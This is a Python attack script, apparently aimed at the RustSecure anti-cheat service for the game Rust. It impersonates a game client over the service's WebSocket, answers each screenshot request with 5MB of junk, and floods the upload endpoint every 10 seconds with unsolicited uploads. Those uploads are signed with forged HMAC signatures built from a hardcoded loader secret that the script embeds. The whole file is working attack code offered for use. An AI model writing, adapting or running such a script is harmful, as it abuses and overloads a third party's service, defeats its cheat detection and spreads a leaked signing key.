#!/usr/bin/env python3
"""
RustSecure screenshot spam bot.
Connects via WS, waits for RequestScreenshotV2, uploads 5MB junk on every request.
Also sends unsolicited uploads every N seconds using self-signed requests.
"""

import asyncio, json, base64, time, os, subprocess, sys, hashlib, hmac

try:
    import websockets, requests
except ImportError:
    print("pip install websockets requests"); sys.exit(1)

WS_URL = "wss://rustsecure.ru/ws"
UPLOAD_URL = "https://rustsecure.ru/api/ingest/screenshot"
BRIDGE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "crypto_bridge.exe")
PAYLOAD_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "spam_5mb.bin")
LOADER_SECRET = "R260iT7ujsI58aTxAExVby6qea3L056h6SfnEr2BLKbmY2vlvm"

def b64e(d): return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


class Bridge:
    def __init__(self):
        self.proc = subprocess.Popen(
            ["mono", BRIDGE], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, text=True, bufsize=1)
        self.proc.stderr.readline()

    def cmd(self, line):
        self.proc.stdin.write(line + "\n"); self.proc.stdin.flush()
        return self.proc.stdout.readline().strip()

    def genkey(self):
        r = self.cmd("GENKEY").split(); return r[1], r[2]
    def ecdh(self, p, pp):
        r = self.cmd(f"ECDH {p} {pp}").split(); return r[1]
    def derive(self, sh, cn, sn):
        r = self.cmd(f"DERIVE {sh} {cn} {sn}").split(); return r[1], r[2]
    def protect(self, pt):
        return self.cmd(f"PROTECT {pt}")[4:]
    def unprotect(self, env):
        r = self.cmd(f"UNPROTECT {env}")
        return r[4:] if r.startswith("DEC ") else None
    def sig(self, pfx, *parts):
        return self.cmd(f"SIG {pfx} {' '.join(parts)}")[4:]
    def close(self):
        self.proc.stdin.close(); self.proc.wait()


def upload(steam_id, req_id, sig, png_data):
    url = f"{UPLOAD_URL}?method=dxgi&width=1920&height=1080&affinity=0"
    try:
        r = requests.post(url, data=png_data, headers={
            "X-RS-SteamId": steam_id,
            "X-RS-RequestId": req_id,
            "X-RS-RequestSig": sig,
            "Content-Type": "application/octet-stream",
        }, timeout=30)
        return r.status_code, r.text[:80]
    except Exception as e:
        return 0, str(e)[:80]


def spam_upload(steam_id, png_data, count=1):
    """Attempt unsolicited uploads with self-forged signatures."""
    for i in range(count):
        rid = f"spam-{i}-{int(time.time())}"
        issued = int(time.time())
        expires = issued + 3600
        payload = "|".join([steam_id, rid, str(issued), str(expires), "scan", "dxgi"])
        sig = b64e(hmac.new(LOADER_SECRET.encode(), payload.encode(), hashlib.sha256).digest())
        code, body = upload(steam_id, rid, sig, png_data)
        ts = time.strftime("%H:%M:%S")
        print(f"  [{ts}] upload #{i+1}: {code} {body}")


async def run(steam_id):
    png_data = open(PAYLOAD_PATH, "rb").read() if os.path.exists(PAYLOAD_PATH) else os.urandom(5*1024*1024)
    print(f"[*] Payload: {len(png_data)} bytes ({len(png_data)/1024/1024:.1f} MB)")

    crypto = Bridge()
    ph, pubh = crypto.genkey()
    pub_b64 = b64e(bytes.fromhex(pubh))
    nonce = os.urandom(16); nonce_b64 = b64e(nonce)
    ts = int(time.time())
    sig = crypto.sig("client-hello", pub_b64, nonce_b64, str(ts))

    print(f"[*] Connecting to {WS_URL}...")
    async with websockets.connect(WS_URL, max_size=10*1024*1024) as ws:
        await ws.send(json.dumps({
            "type": "ClientHello", "pub": pub_b64,
            "nonce": nonce_b64, "ts": ts, "sig": sig}))

        resp = json.loads(await asyncio.wait_for(ws.recv(), 10))
        if resp.get("type") != "ServerHello":
            print(f"[!] Bad response: {resp}"); return

        spub = b64d(resp["pub"]).hex()
        shared = crypto.ecdh(ph, spub)
        ek, sid = crypto.derive(shared, nonce.hex(), b64d(resp["nonce"]).hex())
        print(f"[+] Session: {sid[:16]}...")

        # PlayerConnected
        pc = json.dumps({"type": "PlayerConnected", "steamId": steam_id,
                         "playerName": "SpamBot", "hwids": {}})
        await ws.send(crypto.protect(pc))
        print(f"[+] Connected as {steam_id}")

        # Background: spam unsolicited uploads every 10s
        upload_count = [0]

        async def spam_loop():
            while True:
                await asyncio.sleep(10)
                upload_count[0] += 1
                print(f"\n[SPAM] Upload #{upload_count[0]} ({len(png_data)/1024/1024:.1f} MB)...")
                spam_upload(steam_id, png_data, 1)

        spam_task = asyncio.create_task(spam_loop())

        # Main loop: listen + heartbeat + intercept real screenshot requests
        while True:
            try:
                raw = await asyncio.wait_for(ws.recv(), 45)
                dec = crypto.unprotect(raw)
                if dec:
                    print(f"\n[<] {dec[:150]}")
                    if "RequestScreenshotV2" in dec:
                        parts = dec.split("|")
                        if len(parts) >= 6:
                            rid, rsig = parts[1], parts[5]
                            print(f"[!!!] REAL screenshot request! Uploading 5MB...")
                            code, body = upload(steam_id, rid, rsig, png_data)
                            print(f"  -> {code} {body}")
                    elif "BanPlayer" in dec:
                        print(f"[!!!] BANNED: {dec}")
                else:
                    print(f"[<] (raw) {raw[:50]}...")

            except asyncio.TimeoutError:
                hb = json.dumps({"type": "Heartbeat", "steamId": steam_id})
                await ws.send(crypto.protect(hb))
                now = time.strftime("%H:%M:%S")
                print(f"[{now}] heartbeat (uploads: {upload_count[0]})")

            except websockets.ConnectionClosed as e:
                print(f"[!] Disconnected: {e}")
                break

        spam_task.cancel()
    crypto.close()


def main():
    steam_id = sys.argv[1] if len(sys.argv) > 1 else "76561198012345678"
    print(f"[*] RustSecure Screenshot Spam Bot")
    print(f"[*] SteamID: {steam_id}")
    try:
        asyncio.run(run(steam_id))
    except KeyboardInterrupt:
        print("\n[*] Stopped")


if __name__ == "__main__":
    main()
